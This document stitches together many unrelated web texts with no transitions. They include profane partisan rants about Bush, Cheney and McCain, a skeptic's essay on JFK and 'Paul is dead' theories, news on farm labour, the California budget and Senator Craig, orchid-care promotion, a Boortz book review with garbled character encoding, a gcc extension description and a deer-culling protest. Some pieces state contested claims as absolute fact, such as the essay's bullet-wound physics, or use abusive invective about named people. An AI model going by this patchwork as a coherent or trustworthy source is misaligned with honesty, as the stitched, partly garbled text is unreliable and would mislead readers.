The Bush administration and its politicized military are already blaming the failure of " the surge " on Iran .
Iran is alleged to be training and arming Iraqis who resist the US occupation .
Bush has said he will hold Iran responsible .
There is abundant evidence that the Bush administration is preparing yet another illegal attack on a Muslim country without assessing the consequences .
The Bush administration seems destined to produce such disasters that it will be driven to the use of nuclear weapons in order to avoid defeat .
The Bush administration possesses the combination of evil and stupidity required to escalate a failed " cakewalk war " into a nuclear one .
Many of the administration ’s most evil members — Wolfowitz , Feith , Libby , Rumsfeld , Rove , and Gonzales — have been discarded as the tragedy deepens , but Cheney remains ensconced as does the moron in the White House .
Before they fall , Bush and Cheney will bring more sorrow to the world and more shame to Americans .
The Best of Paul Craig Roberts
Forty - three years after that Friday in Dallas , JFK is still the victim of a massive conspiracy , Elvis is still alive and presumably eating chocolate - covered fried chicken , and Paul McCartney is dead .
For those who do n't know , Paul supposedly died in an automobile crash in 1966 and was replaced by a double .
The new Paul — or " Faul " ( for " Fake Paul " ) — has been impersonating him for , lo , these many years .
One Web site , at www.uberkinder.5u.com/paul/, not only has all the usual clues from the Beatles 's album covers and music but compares voices and superimposes pictures of Paul at various times during his career to contrast noses , chins , bone structure , etc .
There really is a lot of evidence to support the theory that McCartney is dead .
The idea is presented cogently and backed by mountains of evidence .
Like so many theories , it is neat and plausible , but , nonetheless , wrong .
The reason conspiracy theories are such an important subject is that we exist in a world awash with them : Kennedy , the origin of the AIDS virus , our supposedly faked moon landing , the death of almost anybody famous ( Lennon , Princess Diana , John Kennedy Jr. , Elvis , etc. ) , the government being involved in inner-city drug conspiracies , and on and on it goes .
But some might inquire what difference it makes if people believe in cloyingly clever canards .
We dwell in a world where fairy tales and fictions are already the norm .
According to articles I 've read , 70 percent of the public believes that there was a vast conspiracy to kill JFK , 80 percent believes in the existence of UFOs , and approximately 95 percent believes in supernatural beings such as ghosts , gods , devils , angels , and poltergeists .
In effect , everything in the world of conspiracies is the opposite of what it is in reality .
Paul McCartney , who is really alive , is dead ; Elvis , who is really dead , is alive .
Since so many people saw JFK being fatally injured , you can't say he 's alive , so they go for the next best thing : massive conspiracy .
Whatever is . . . is n't .
Whatever reality you do n't like , you can change with the handy eraser on the end of your pencil - like head .
So what difference does it make ?
I maintain that one of the reasons the world is in the jolly shape it's in is that we have many people believing in and , more significantly , acting upon things that are simply not true .
When we believe in fairy tales , we keep ourselves timorous children .
We lose our individual strength and begin looking to things outside of ourselves for that strength and guidance .
Let 's look briefly at the most famous conspiracy theory , JFK 's assassination in Dallas .
[ See also Massimo Polidoro 's column " Facts and Fiction in the Kennedy Assassination , " Skeptical Inquirer , January / February 2005 . ]
Seventy percent say it was a conspiracy .
This makes not believing it was a conspiracy seem naïve , gullible — well , let 's face it , downright jug - headed .
Much is made of the grassy knoll , located in front and to the right of Kennedy when the shooting occurred .
Many people have opined that the shots came from there .
Oliver Stone , in his movie JFK , suggests that the horrific head shot that killed Kennedy came from there .
As a young boy , my father took me out hunting probably hundreds of times .
I shot hundreds if not thousands of animals ( something I no longer do ) .
All of the animals that met their deaths from my gun ( deer , rabbits , squirrels , birds ) died the same way : small holes where the bullet entered , perhaps a minuscule trickle of blood , and , if the bullet hit bone , massive , craterlike holes in their bodies where the projectile exited .
It 's simply a case of physics .
No bullet ever made has the ability to tear large holes where it enters ; it can only create them where it exits .
This is because the bullet is intact when it enters and then explodes or fragments upon hitting bone .
And the same is true of the bullet that struck JFK .
As anyone who has ever hunted could tell you , the head shot that took the front right part of Kennedy 's head off could have come only from behind .
There is no other possibility , so scratch the grassy knoll .
The second area of doubt I would like to broach is the following , which I have never , by the way , seen addressed or answered in all my years of reading about the Kennedy case .
If Oswald was part of a grand conspiracy and was ordered , commissioned , and paid to execute the president , is the method of getting a job in a building and then hoping you get lucky with the target actually driving by a viable hitman strategy ?
Obviously , Oswald did n't go to Kennedy — as all other hitmen do ; Kennedy came to Oswald .
Does this really sound like a conspiratorial plot to you ?
Or does it sound like what it was , not a crime of conspiracy but a crime of opportunity ?
By the way , Kennedy was n't scheduled to go to Dallas until just a couple of days earlier .
His staff made a last - minute change for him , so he could go stumping ( i.e. , campaigning ) for Democratic congressional candidates .
Nowhere in the years since the shooting have I ever read or heard that anybody has ever suspected Kennedy 's own inner staff of setting him up .
They question every other aspect of the case from A to Z , but I do n't know of anybody , official or unofficial , who has suspected the staff within the White House of being part of a grand conspiracy .
His being rescheduled for a visit to Dallas was just one of those things that comes up all the time in politics .
The thing that caught my attention about the McCartney conspiracy case was that it had so much detail , just like the Kennedy case .
There are literally hundreds of pieces of " proof " that McCartney is dead .
His height changing in different pictures , voice analysis , picture analysis , and on and on .
As with the Kennedy case , there are endless pieces and tidbits here and there that can be combined to make it look like a strong case .
However , anything , anywhere or anytime , can be made to look like a conspiracy , if that is what your agenda is at the outset .
There are such things as inductive and deductive reasoning .
In deductive reasoning , you start with a premise or hypothesis ( e.g. , Kennedy 's assassination was a conspiracy ) and then you look for all the pertinent information , modify it to suit your hypothesis , and throw out all that does n't fit .
It 's what we use in our adversarial legal system .
One side scours for what it wants to find and so does the other , to support their diametrically opposed theories of the case .
What it really comes down to is modern - day sophism ; you have parties spinning theories and then finding , spinning , or cooking up evidence that supports what they want to believe .
( It is , in my always humble opinion , one of the principal flaws in our legal system . )
Deductive logic is by far the most prevalent way of thinking in our society .
The other method is using inductive reasoning .
Withholding judgment or theory , looking at all the evidence , and then formulating your belief or theory based on all of the available evidence — regardless of what you may prefer the evidence to say .
This is actually one part of the scientific method .
The fact is that Kennedy was shot by Oswald acting alone .
We did go to the moon .
Inner -city drugs were not the result of a massive government conspiracy .
John Lennon was murdered by a lone religious nut ( crazy but , nonetheless , religiously motivated by Lennon 's remark about being more popular than Jesus ) .
Princess Diana was killed by a drunk driver .
JFK Jr. died when he flew into dark cloudy skies without being appropriately trained to fly by instruments alone .
Elvis died from too many pills and too much fried chicken .
The government did not create AIDS .
And , while I 'm on this subject of government conspiracies , let me add something .
Unlike on TV and in films — where government agencies are often flawlessly competent — we too often see evidence to the contrary in real life .
Think about that for a minute .
At the time of this writing , Osama bin Laden is still at large .
The FBI could n't find the Unabomber for eighteen years , until his brother turned him in .
This is why I find it hysterically goofy when I hear and read about these great conspiracies that presumably include hundreds of people over the span of many decades .
They 're going to keep hundreds of witnesses , investigators , and agents quiet about the Kennedy case ?
Hundreds of people over decades ?
Kill the info about UFOs ?
There are no James Bonds here .
No Moriartys , no Holmeses , not even any Watsons .
No Goldfingers , either .
This is the gang that said security guard Richard Jewell was the Olympic Park bomber .
Grand conspiracies , folks ?
Ha ha ha .
In point of fact , my only concern involving the government in this area is that someone will plant a bomb right on top of the Statue of Liberty 's noggin and the agencies will mistake it for an alarm clock .
Of course , I could secretly be an op of the government hired to write articles like this to throw people off the scent .
I bet I did n't fool you one bit , did I ??
The article first appeared in the September / October issue of Skeptical Inquirer magazine .
Chris Volkay wrote “ Bigfoot , Pluto , and ? ” in the January / February 2007 issue of the magazine .
In a development that ’s surprised exactly no one , fruits and vegetables are rotting in fields across the United States after a crackdown on illegal immigration .
An excellent and moving story in the Chicago Tribune earlier this month reported that farmers have had trouble getting the crops in , with more labor shortages likely on the way :
[ T ]he growers are now counting on a string of troubled harvests to persuade Congress to come to agriculture ’s rescue , pointing to Michigan , where farmers say they lost 20 percent of their asparagus crop earlier this year because they did n’t have enough workers .
Last year Michigan apple growers say they lost up to 15 percent of their crop for the same reason , and they are now anxiously waiting to see if enough farmhands show up for the coming harvest .
It ’s estimated that 70 percent of farm workers are illegal immigrants , and farmers are blaming tighter border security for the shortage .
The Tribune talks to a 27 - year - old who was arrested seven times at the border in the last month before making it across .
He saw bodies in the desert of people who died trying .
Opponents of immigration reform say that farmers should be using the federal H - 2A program , which brings farm workers to the United States legally .
But farmers call the program too slow and bureaucratic , and are pushing Congress for reform ( i.e. , the right to hire undocumented workers ) .
In New York ’s Hudson Valley , where apple trees have had a “ vintage ” crop this year , the New York Times says that growers are nervous about a new regulation which will hold them responsible for hiring illegal immigrants with fake documents — even if the farmers believed the documents were legitimate .
Fewer immigrant workers may mean fewer New York apples , says Peter Gregg , a spokesman for the New York Apple Association :
‘ We have three billion apples to pick this fall and every single one of them has to be picked by hand , ’ Mr. Gregg said .
‘ It ’s a very labor - intensive industry , and there is no local labor supply that we can draw from , as much as we try .
No one locally really wants to pick apples for six weeks in the fall . ’
With immigration reform stalled , the industry is putting more money into mechanization .
NPR ’s Marketplace reports on the development of fruit - picking robots , or “ agrobots . ”
In theory , the robots will even be able to determine if the fruit ’s ripe .
Of course , since fruit in orchards is rarely picked ripe , that ’s , sadly , an unnecessary feature .
California budget deadlock broken as Democrats accede to right - wing demands
By Daniel Jenkins
12 September 2007
California Governor Arnold Schwarzenegger signed the state budget into law late last month after a 51 - day deadlock in the state legislature that paralyzed funding for government services in the nation ’s most populous state .
Republicans in the State Senate had refused to sign the bill , which requires a two - thirds majority for approval , demanding greater budget cuts to eliminate the state deficit .
They also sought assurances that state Attorney General Jerry Brown would not sue counties and municipalities that failed to meet mandated reductions in greenhouse gas emissions .
Since taking office in 2003 , Schwarzenegger has relied on bipartisan support to push through his reactionary agenda .
At the same time , the Republican governor has postured as someone who is above the partisan fray while oscillating between the extreme right in his own party and so - called moderate Democrats .
Last May , when the governor proposed massive cuts in state welfare programs , the Democrats were given the opportunity to masquerade as champions of the poor before Schwarzenegger concluded a deal with them .
In August , the Democrats returned the favor , joining with Schwarzenegger in denouncing Republican senators for the budget deadlock , before capitulating to their demands .
Senate Republicans were able to extract two major concessions before providing the two necessary votes to pass the budget : $ 700 million in budget cuts were imposed , using Schwarzenegger ’s line - item veto , and a separate bill was passed establishing a two - year moratorium on global - warming lawsuits against public works projects funded by state and local bonds .
The use of the line - item veto is a particularly cynical maneuver , allowing Democrats to claim that they never voted for the compromise budget .
The character of the cuts — which will have a devastating impact on working and poor people — reveals the class interests to which both political parties are beholden .
Seventy - five percent of the cutbacks — or $ 527 million — will come from the Health and Human Services Department , the state agency that oversees welfare programs , including $ 55 million from the Integrated Services for Homeless Adults with Serious Mental Illness program .
At the same time , the budget provides a $ 45 million tax break for yacht owners .
The cuts also include $ 30 million cut from state park funding , $ 6 million cut from prescription drug discounts , $ 17.4 million from aid to senior citizens and $ 40 million from drug - abuse treatment centers .
In addition , $ 84 million in federal TANF ( Temporary Aid to Needy Families ) money is being diverted to the General Fund , as is $ 1.3 billion previously earmarked for public transportation .
The budget passed by the State Assembly July 20 contained significant cutbacks in social programs , which were demanded by both Governor Schwarzenegger and Republicans to guarantee passage of the bill .
That bill included $ 500 million in tax credits negotiated by the Republican Assembly caucus and no funding to help cover fee increases at public universities .
The Republicans had demanded even greater budget cuts , ostensibly to eliminate the deficit , coupled with more tax cuts for corporations and the wealthy , including $ 850 million in tax cuts for large corporations and the entertainment industry .
The Democrats , having no principled differences on this score , essentially capitulated to all but the most extreme demands , while posturing as opponents of cuts in social services .
While a spokesman for Senate President Pro Tem Don Perata , a Democrat , stated in July , “ We [ the Democrats ] are not considering cuts to children on CalWORKS [ California Work Opportunity and Responsibility to Kids , the major state welfare program ] , ” the enacted budget does exactly that .
It freezes increases in cost - of - living allowances for the third year in a row .
Constitutionally , the state of California is required to approve a budget by June 15 , two weeks before the beginning of the fiscal year .
The budget requires a simple majority vote for approval in the State Assembly , the lower house of the state legislature , but a two - thirds supermajority in the State Senate .
If no budget is approved by July 1 , state budget allocations are withheld from recipients .
This year ’s situation is hardly new — 16 of the last 20 budget bills have been approved after July 1 .
Since 1998 , there has been a $ 2 billion emergency fund for recipients of Medi-Cal funding , the state healthcare program for the poor and uninsured .
Although originally designed to last for two months , the fund was never indexed to inflation , and ran out before the end of July .
The budget deadlock had a disastrous effect on all social services , which suddenly resulted in a cutoff of state funds .
In all , more than $ 3 billion was withheld from daycares , nursing homes , medical clinics , community colleges and other providers of essential services .
To continue operating , many were forced to rely upon lines of credit , of which only the principal will be reimbursed by the state .
Reimbursements did not commence until August 27 and will certainly prove inadequate .
Some service providers are reported to be paying 95 percent interest on loans drafted to cover shortfalls during the budget deadlock .
The delay in passing the state budget has also narrowed to three weeks the timeframe during which the legislature may debate further legislation , most important of which is the healthcare bill proposed by Schwarzenegger .
In the shortened session , Republicans controlling key votes will find their clout much stronger than in normal sessions , and will be able to push legislation even further to the right .
The Democratic leadership in Sacramento made a determined effort to pose as defenders of the poor and working class , but has overseen an evisceration of social welfare programs over the last three decades .
In control of the state legislature since 1970 , California Democrats have consistently and ruthlessly attacked the working class .
This right - wing shift comes as the growing polarization in wealth continues apace .
A new study by the California Budget Project , A Generation of Widening Inequality : The State of Working California , spells out the growing social polarization in the state , where low - wage workers ( the lowest fifth of wage earners ) have seen a decrease in real wages of 7.2 percent from 1979 to 2006 , while the highest - income ( the top fifth of wage earners ) saw their real incomes increase 18.4 percent over the same period .
The median wage rose a mere 1.3 percent .
At the same time , California had 39,013 foreclosures notices in July , a 289 percent increase from the year before , and has led the nation in foreclosure notices every month in 2007 .
Of US metropolitan areas with the highest foreclosure rates , 6 of the top 10 were in California .
This polarization in wealth finds a corollary in the population ’s alienation from the political system in California .
Polls in mid-August showed that only 12 percent of Californians were closely watching the budget news — not surprising given the increasingly backroom and antidemocratic nature of negotiations — and only 22 percent approved of the legislature ’s handling of the budget .
Schwarzenegger himself was brought to the governorship on wave of popular disgust with the right - wing policies of his predecessor , Democrat Gray Davis .
Schwarzenegger ’s vulgar populism , an integral part of the antidemocratic 2003 gubernatorial recall campaign , has allowed the former actor to posture as an independent political force , while working actively with both parties to attack the living standards of the working class .
This was on display most notoriously in the 2005 special election , when he sought voter approval for measures that would have further restricted the influence of the unions and given himself the power to unilaterally impose budget cuts .
Commentators in the bourgeois press have claimed that amending the California constitution to allow for a simple majority in both of the Democratic - controlled houses of the legislature to ratify the budget would remove the threat of this year ’s budget situation repeating itself , thus making the entire process more democratic and responsive to the needs of the population .
Such proposals ignore the reality that the two parties are united in attacking the living standards of the working class in order to serve a small constituency of wealthy individuals .
No less than the Republicans , the Democrats in California and nationwide are committed to a policy of attacking the already meager remnants of the welfare state .
Despite tactical differences , both major parties are in agreement on the necessity of eliminating social programs , implementing tax cuts for the richest individuals , and removing all constraints on the accumulation of wealth while condemning millions to poverty .
Care Of Orchids
Taking Care Of Orchids
The hobby of raising orchids has been celebrated for over 100 years , but taking care of orchids is something that many people think cannot be done by a novice .
But I must tell you , even the non-experienced can grow orchids !
In fact , some orchid species are quite simple to care for and with at least 20,000 species of the plant to choose from , this is a hobby that most anyone can tackle .
We all know that orchids love humid climates which is why a lot of people assume they cannot grow them themselves .
While it is true that some need tropical weather , others will do well with 40 % huymidity ..
Tips For Proper Care Of Orchids :
First off , you definately should have a good book to use for reference and guidance .
Orchid expert Nigel Howell has an excellent ebook - The Orchid Care Expert - that consists of all kinds of tips and information and you can download it right away .
A great eBook will ensure your success and make things a good deal easier .
Humidity is essential for your orchids survival .
You want to make sure to select your plants carefully according to the amount of humidity the species should have .
Orchids need between 40 and 70 % humidity so you 'll want to pick one that needs the amount of humidity you can provide .
You 'll want to be certain you can provide your orchids with the right amount of sunlight .
Orchids do not necessarily need a lot of sun , so be sure to find out what is appropriate for your species .
Either way , putting your plant near a sunny window should work fine but you might also consider grow lamp if you are in a northern area for added light in winter .
One thing that all plants need , and orchids are no exception is water .
This is in fact where a lot of beginners go wrong - they give the plant too much water !
Orchids will benefit from modest weekly watering .
Watering is a balancing act because you do n't want to leave standing water , but you do n't want the soil to dry out too much between waterings either .
Taking care of orchids does n't have to be difficult in fact , you might discover that the difficult part about growing orchids is choosing which species you want to grow !

Barrack Obama just said that women make better leaders than men , and this also applies to computers .
We look forward to encouraging women to confidently undertake careers in computer and related fields .
And Grepgrrl makes women be leaders in programming , web and app development , and other sectors in the world of computing .
With the rise in demand for online games , game developers are always on the lookout for the best creative and tech - savvy people out there , including talented women .
Including women in the workforce is important both for the company to establish a reputation as a fair and diverse workplace and for women too , as this opens new doors in an industry that has been dominated by men for many years .
Gender does not matter
As it has been proven over and over in the last few years , women are as capable as any man in handling computing jobs , bringing into the scene a different perspective .
In the gaming industry , women are an important part of the development of some of the most popular online games .
Their ideas are valued and many women now occupy important positions in every aspect of game development from creating the idea , designing the graphics and animations as well as being responsible for the final testing before they are launched in various online casinos .
In modern society , women have a very important role in the IT industry .
In coming years , their role will continue to grow as well as their importance , establishing their reputation without question , earning them much respect in a world that strives for innovation .
Why did n't they do a ride along on a real patrol ?
Perhaps they could have joined the U.S. team that responded to an ambush of an American patrol yesterday ?
Of course a total of six U.S. soldiers died in that operation .
Shit !
You can't take real risks .
No sir .
Instead , U.S. military resources are devoted to making propaganda .
U.S. soldiers were ordered into harms way just to ensure a congressional delegation could walk around , look serious , and perpetuate the lie that more U.S. soldiers must come to Iraq and die .
That was a propaganda event and fucking General Petraeus ought to be ashamed .
U.S. soldiers entered the neighborhood before the delegation arrived for its stroll .
They searched for explosives , sent informants into the crowd , set up a perimeter , and secured the area before the Senators showed up with their 100 armed guards .
And for what ?
To keep McCain , Graham and others safe .
What happened to the Iraqi utopia John McCain so confidently insisted was there for eveyone to see ?
If the " true " picutre of Iraq was simply a matter of getting the news cameras pointed in the right direction then why did he need a security detail ?
If the peace and prosperity the Iraqi people are celebrating in safe neighborhoods is genuine then why wear body armor ?
You know why ?
Because John McCain is completely full of shit .
He may be delusional but his survival instinct is still intact .
When he goes into a war zone he wants to be protected .
And U.S. soldiers carried out that mission yesterday so John McCain could try to hoodwink the American people into backing the surge and sending more troops into harms way .
I do n't know about you , but that pisses me off .
Managers say a healthy sex life leads to greater productivity
Managers at the Bulga pit , north of Sydney , say the so - called toolbox talks help workers to understand their wives , making them happier and healthier .
Mining firm Xstrata says the scheme has been so successful that it wants to extend it to other pits .
The briefings are on a different topic each month and have included advice on fatigue , nutrition and heart disease .
' Extremely attentive '
Company bosses say giving their predominantly male employees lessons on the menopause and foreplay gives them a healthy sex life , which in turn makes them happy , productive workers .
" We have to look at the lifestyles of our employees , making sure they are fit and healthy at work , but also fit , healthy and happy at home , " Xstrata spokesman James Rickards told Reuters .
I told them that they needed to start exploring their wives like they did when they were 18
Tammy Farrell
Course co-ordinator
" Sex is an important part of any relationship , and it 's important to address sex for an individual that is going through menopause . "
Course co-ordinator Tammy Farrell , from Core Health Consulting , told the BBC that she was trying to promote communication and make the miners more aware of their health .
She added that the miners were taking the classes seriously and sharing their own experiences .
" If one man is game enough to put up their hand , you 'll slowly notice three or four nods in the room , " she said .
" If we can get two people out of all that who can change their lives , then that 's fantastic . "
Earlier , she told the Sydney Morning Herald that the miners had been " extremely attentive " when she advised them to " start exploring their wives like they did when they were 18 " .
" They snapped up all the flyers after the talk so we 've obviously got some cranky men with cranky wives out there who want some help , " she told the paper .
Other classes have covered nutrition , heart disease , prostate cancer and fatigue management .

As a regular listener of The Neal Boortz Show , I find this book every bit as hard - hitting , insensitive , informative , and entertaining as his show .
The High Priest of the Painful Truth pulls no punches in his assault on ignorance whether from the Right , the Left , or Center .
The Libertarian Party ( the party that most closely reflects his views ) is even skewered on a number of fronts .
Itâ€™s difficult to know how people who do not listen to his show will respond .
You will likely find this book near books with a conservative political bent but conservatives who expect to find yet another book which relentlessly attacks the Left while keeping their sacred cows protected will be sorely disappointed .
While Boortz dedicates a significant portion of the book to the lunacy of the Left , the Right is criticized for pushing their religious anti-science agenda on the American public ( especially in government schools ) , their homophobia , and their continuous chipping away at the limited government platform they claim to embrace .
Boortz has many targets in this book but none receive more of his ire than government schools .
Teacherâ€™s unions exist solely to keep mediocre to incompetent teachers in a job ; they will fight tooth and nail to prevent any kind of competition from private schools .
But government schools are even more harmful that what we can see on the surface .
Want to know why the American public has lost its love for freedom in exchange for security from an ever expanding government ?
According to Boortz , government schools are to blame .
Government schools teach school children from a very young age that government is good and is the solution to every problem .
There is even a chapter dedicated to how school children learn their first lesson in communism .
Have you ever taken your child to the store and bought school supplies on a list only to have the teacher take those supplies away from your child to be donated to the class ?
If you donâ€™t believe this to be a big deal consider the lesson your child is learning : he or she must give up his or her private property ( school supplies in this case ) for â€ œthe greater goodâ€ of the whole society ( the classroom in this case ) .
Is it any coincidence that most Americans erroneously believe that Americaâ€™s government is a democracy rather than a constitutional representative republic ?
Is it any coincidence that most Americans donâ€™t know the difference or know why this distinction is important ?
Boortz contends that this is not by accident but by design .
The purpose of government schools is not to educate students but to indoctrinate them into obedient citizens subjects .
Eventually , these school children grow up to be voters ( Did I mention that the author finds no constitutional guarantee to the right to vote ?
Sounds crazy but once you read his arguments and consult the U.S. Constitution , he makes a compelling case ) .
After thirteen years of government indoctrination , many of these adults see no problem with wealth redistribution , the welfare state , the nanny state , and have no genuine appreciation for liberty .
This makes it very easy for politicians to pander to the American public to meet all of these needs which far too many people believe to be birthrights .
Those who believe this the most tend to vote Democrat which leads me to his chapter â€ œThe Democratsâ€ ™ Secret Plan for America.â€ 
Boortz mockingly calls the Democrat plan a â€œsecret planâ€ because of how Democrats typically scare various constituencies about Republican secret plans to kick old people into the street , burn black churches , and starve babies .
Much of the secret plan is no secret at all however .
So what do the Democrats have in store for America should they retain congress and win the presidency ?
According to the author we can expect the entire tax burden to be shifted to the wealthy , imputed income ( which would put most all home owners in a higher tax bracket ) , place caps on income for those who â€œmake too much , â€ add taxes to 401k and other investment vehicles which are not currently taxed , womb to the tomb universal government healthcare , the reinstatement of the â€œfairness doctrineâ€  ( which would effectively put an end to talk radio ) , the repeal of the Second Amendment , and several other such wet dreams of the far Left .
If you donâ€™t read any other chapter in this book , read this chapter .
Certainly , this book isnâ€™t one which will leave the reader thinking â€ œIts morning in Americaâ€  but it does offer a fair amount of humor , positive solutions ( such as what should be taught in government schools ; provides his own citizenship test ) , and an inside peek of the talk radio business .
Boortz opens the book by introducing himself , his interests and how he got into talk radio ( under rather tragic circumstances ) .
Even in the chapters that contain a discouraging outlook have a healthy dose of humor .
But if you are overly outraged after reading the chapter about government funded art or the Democrat Partyâ€™s war on the individual , skip to â€ œChasing Catsâ€  or â€ œTerrorizing the Mailroom .â€ 
I wonâ€™t give away what these chapters are about but I assure you that you are in for a good belly laugh ( that Boortz is quite the prankster ) .
Somebodyâ€™s Gotta Say
It is a refreshingly honest , sober view of the body politic , American culture , and state of our world .
Boortz presents a variety of original controversial ideas on a variety of issues .
Such proposals would certainly make the political debate more productive if not more interesting ( a number of these proposals can be found toward the end of the book in a chapter entitled â€ œNo Way in Hell.â€ ) .
I highly recommend this book for anyone who is not easily offended .
Anyone who is easily offended should skip this book in favor of a selection from the Oprah Book Club .
my gcc
the customizable gcc compiler
what 's this ?
Mygcc is an extensible version of gcc ( the GNU C compiler ) , that can be customized very easily by adding user - defined checks for detecting for example memory leaks , unreleased locks , or null pointer dereferences .
User - defined checks are performed in addition to normal compilation , and may result in additional warning messages .
Gcc already includes many built - in checks such as uninitialized variables , undeclared functions , format string inspection , etc .
Mygcc allows programmers to add their own checks that take into account syntax , control flow , and data flow information .
The implementation of mygcc as a lightweight patch to gcc is based on the disruptive concept of unparsed pattern matching , which make the patch easily portable to virtually any other compiler for any language X , written in any language Y .
Unparsed patterns are now also available as the myPatterns open source library for pattern matching of general data structures in any C program ( not just for matching program trees in compilers ! ) .

Mygcc 's patch to gcc did not currently got the approval to become part of the standard gcc release , because of some technical reason : the implementation is dependent on a possibly evolving part in gcc , namely the pretty - printer .
As a consequence , a condition for future inclusion is to switch from the unparsed pattern matching mechanism to a more classical tree pattern matching .
This implies a major rewrite of the patch , consisting in a pattern parser .
Any volunteer for this task is warmly welcome !
Until then , we distribute separate snapshots .
Enjoy using mygcc , and feel free to send us any feedback !
history
Mygcc has been originally developed by Nic Volanschi , starting in 2004 .
In 2006 , Sebastian Pop joined the team , incorporated and maintained the patch inside the Graphite gcc branch some time , and ensured it got more compatible and coherent with the rest of gcc .
Later on , the patch got its own branch called Condate , waiting to get mature enough to be submitted to the main trunk ( as explained above ) .
In 2007 , Zhouyi Zhou et.al .
extended the mygcc patch to gcc in order to apply it for checking the MAC Framework implementation of the FreeBSD kernel , as part of a Google Summer of Code project .
Their extensions are available separately .
Many other people provided very useful feedback .
bugs
Mygcc is still an experimental compiler .
If you encounter problems using it , please consider reporting the bugs you found .

h/t Agitprop , Congressman Vitter 's alleged prostitute / mistress and his wife , both named Wendy .
When asked what Wendy Two would do that Wendy One would not , the blogosphere responded , " everything , pretty much , and unlike the Senator , the prostitute has a talent for telling the truth . "
Talking Points Memo :
A former New Orleans prostitute who says she had an affair with Sen.
David Vitter has passed a lie - detector test and will provide details of the four - month relationship at a press conference Tuesday , according to Hustler magazine publisher Larry Flynt .
Vitter , a first - term senator [ Republican ?

In a call - in radio show during the Senate campaign , he dismissed as " absolutely and completely untrue " that he had a relationship with [ the prostitute , ] Wendy Cortez .

There 's more juicy over at the NOLA blog Your Right Hand Thief .
The schism in the administration is deepening in a way that should alarm Hillary .
Mark Mazzetti and Helene Cooper report in today ’s Times that Cheney and his hawks are arguing that the Israeli intelligence about Syria ’s nascent nuclear capabilities that led to last month ’s Israeli strike on Syria was credible and should dictate a harsher policy toward Syria and North Korea , while Condi , Bob Gates and calmer heads “ did not believe the intelligence presented so far merits any change in the American diplomatic approach . ”
Hillary ’s hawkish Iran vote was an ill - advised move , especially given her private view that Cheney is untrustworthy and given Sy Hersh ’s New Yorker report claiming that Cheney had pushed to devise a plan to attack the Revolutionary Guard facilities in Iran .
She made a course correction on Oct. 1 , co-sponsoring legislation introduced by Mr. Webb to prohibit the use of funds for military operations against Iran without explicit Congressional authorization .
Her opponents have sounded the fool - me - once - shame - on - you , fool - me - twice - shame - on - me drumbeat .
Obama chided Hillary for her willingness “ to once again extend to the president the benefit of the doubt . ”
John Edwards wondered if in “ six months from now he goes to war in Iran , are we going to hear her once again say if only I had known then what I know now ? ”
When Hillary voted to let W. use force in Iraq , she did n’t even read the intelligence estimate .
She was n’t trying to do the right thing .
She was trying to do the opportunistic thing .
She felt she could not run for president , as a woman , if she played the peacenik .
By throwing in with Joe Lieberman and the conservative hawks on the Iranian Revolutionary Guard issue , she once more overcompensated in a cynical way .
She ’d like to paint Obama as the weak reed who wants to cozy up to dictators , while she ’s the one who will play tough .
It was odd , given her success in the debates conveying the sense that she is the manliest candidate among the Democrats , that she felt the need to man-up on Iran .
Networks : Craig expected to resign , possibly as soon as today

CNN reported live on air at 9:02 am ET that Sen. Larry Craig ( R - ID ) was expected to resign after an escapade involving the solicitation of an undercover police officer in a Minneapolis bathroom .
" Several well - placed GOP sources in Washington and Idaho say embattled Republican Sen.
Larry Craig is likely to resign soon , possibly as early as Friday , " CNN said .
" A GOP source with knowledge of the situation told CNN's Dana Bash that the Republican National Committee was poised to take the extraordinary step of calling on Craig to resign . "
Fox News followed up moments later by saying the senator would resign today .
" Craig is expected to resign but if he does n't the Republican party is prepared to act against him , " a Fox reporter said .
The " GOP has prepared a statement calling on him to resign but they are holding it .
They say that if he does n't resign they will not support his campaign and will actively recruit and campaign against him .
They are sending him many signals that he does not have a choice but to resign . "
Party leaders were going to issue a statement calling on Craig to resign , but held back .
Craig is suspected to have told them he would do it himself .
Senate insiders are being tight - lipped about details , the network said .
Sources " confirmed " to CNN that " high - level meetings " were underway in Idaho on Thursday .
Parents have noticed .
“ You do n’t have to have ‘ Leave it to Beaver ’ on , but for Pete ’s sake , you do n’t have to have Eva Longoria seducing the high school kid on the dining room table , either , ” said Timothy Winter , president of the Parents Television Council , which offers parents advice on program selections .
Mr. Winter said he received weekly complaints about airline movies from parents , whereas last year he received none .
Mr. Kleiman , of Continental , said that at times there were not enough popular romantic comedies and other lighter movies to fill the available slots in his airplanes .
When an airline chooses to feature R- rated movies , he said , movie studios send an uncut version to the airlines , along with a list of suggested cuts .
Jeff Crawford , who oversees the division of Warner Brothers that markets movies to airlines , said his editors “ know what to do , ” adding , “ They ’re doing it both for the airline and for TV , down the road , where we ’d obviously try to tone down the graphic violence or blood . ”
Nina Plotner , an account manager with Inflight Productions Inc. , which works on behalf of many airlines to review and acquire films , said of the editing procedure , “ If we take all the good things out , there ’s not going to be a lot left to play . ”
Ms. Plotner added : “ If you get a complaint , you get a complaint .
You ca n’t please everybody . ”
Mr. Kleiman , of Continental , agreed , saying : “ People love Pepsi , and we do n’t serve that , so there you go , we just ruined their flight .
That ’s an accurate analogy . ”
Airlines said they received relatively few complaints .
The debate about suitable content in airlines comes against the backdrop of a continuing debate about movie violence in Hollywood .
Researchers have determined , for example , that standards for films rated PG - 13 ( parental guidance suggested for those 13 and under ) have become more lax in recent years , with such films often featuring violence , sexual situations and profanity that would have been R- rated ( suitable for age 17 or over ) a decade ago .
Indeed , many airline movies cited by parents and critics have been rated PG - 13 , including “ King Kong . ”
Shari Maser of Ann Arbor , Mich. , spent part of last year sitting up at night with her 7 - year - old daughter , who had nightmares after seeing a preview for “ King Kong ” on a US Airways flight .
It showed people being attacked by dinosaurs .
Save the White Deer - Pt. Reyes , CA The Basic Facts :
The Fallow and Axis Deer were brought to the Point Reyes National Seashore by humans in 1948 .
The deer have since naturalized in the vast and beautiful surroundings .
In the summer of 2007 , the National Park Service will begin killing the Fallow and Axis Deer of the Point Reyes National Seashore as part of their non-native extermination policies .
Friends of the White Deer are calling for humane management of the population of deer , not extermination , in order to preserve the deer , which are beloved by locals and the millions of tourists who visit the seashore annually .
What The National Park Service Will Do :
Under the leadership of Point Reyes National Seashore Superintendent Don Neubacher , the National Park Service is considering bringing mercenary animal exterminators from New Zealand to slaughter the deer .
Their methods for exterminating animals include gunning them down from helicopters , hunting with dogs , and beating and stabbing them to death .
